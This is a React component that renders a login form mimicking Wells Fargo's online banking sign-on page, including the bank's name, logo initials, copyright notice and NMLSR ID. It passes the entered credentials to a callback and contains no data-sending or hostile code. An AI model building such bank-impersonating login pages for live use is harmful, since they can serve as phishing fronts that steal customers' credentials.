"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Eye, EyeOff, Lock, User } from "lucide-react"

interface LoginFormProps {
  onLogin: (username: string, password: string) => void
  onForgotPassword: () => void
  onCreateAccount: () => void
}

export function LoginForm({ onLogin, onForgotPassword, onCreateAccount }: LoginFormProps) {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    // Simulate API call
    setTimeout(() => {
      onLogin(username, password)
      setIsLoading(false)
    }, 1000)
  }

  return (
    <div className="min-h-screen bg-red-600 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Wells Fargo Logo */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-red-600 text-2xl font-bold">WF</span>
          </div>
          <h1 className="text-white text-2xl font-bold">Wells Fargo</h1>
          <p className="text-red-100 text-sm">Online Banking</p>
        </div>

        <Card className="bg-white shadow-xl">
          <CardHeader className="text-center pb-4">
            <CardTitle className="text-xl font-semibold text-gray-900">Sign On</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="username" className="text-sm font-medium text-gray-700">
                  Username
                </Label>
                <div className="relative">
                  <User className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                  <Input
                    id="username"
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="pl-10 h-12 border-gray-300 focus:border-red-600 focus:ring-red-600"
                    placeholder="Enter your username"
                    required
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="password" className="text-sm font-medium text-gray-700">
                  Password
                </Label>
                <div className="relative">
                  <Lock className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="pl-10 pr-10 h-12 border-gray-300 focus:border-red-600 focus:ring-red-600"
                    placeholder="Enter your password"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-3 text-gray-400 hover:text-gray-600"
                  >
                    {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                  </button>
                </div>
              </div>

              <Button
                type="submit"
                className="w-full h-12 bg-red-600 hover:bg-red-700 text-white font-semibold"
                disabled={isLoading}
              >
                {isLoading ? "Signing In..." : "Sign On"}
              </Button>
            </form>

            <div className="mt-6 space-y-3">
              <button onClick={onForgotPassword} className="w-full text-red-600 hover:text-red-700 text-sm font-medium">
                Forgot Username or Password?
              </button>

              <div className="text-center">
                <span className="text-gray-600 text-sm">Don't have an account? </span>
                <button onClick={onCreateAccount} className="text-red-600 hover:text-red-700 text-sm font-medium">
                  Open an Account
                </button>
              </div>
            </div>

            <div className="mt-6 pt-6 border-t border-gray-200">
              <div className="text-xs text-gray-500 space-y-2">
                <p>• Use strong passwords and keep them secure</p>
                <p>• Never share your login information</p>
                <p>• Always sign off when finished</p>
              </div>
            </div>
          </CardContent>
        </Card>

        <div className="mt-4 text-center">
          <p className="text-red-100 text-xs">© 2024 Wells Fargo Bank, N.A. All rights reserved. NMLSR ID 399801</p>
        </div>
      </div>
    </div>
  )
}
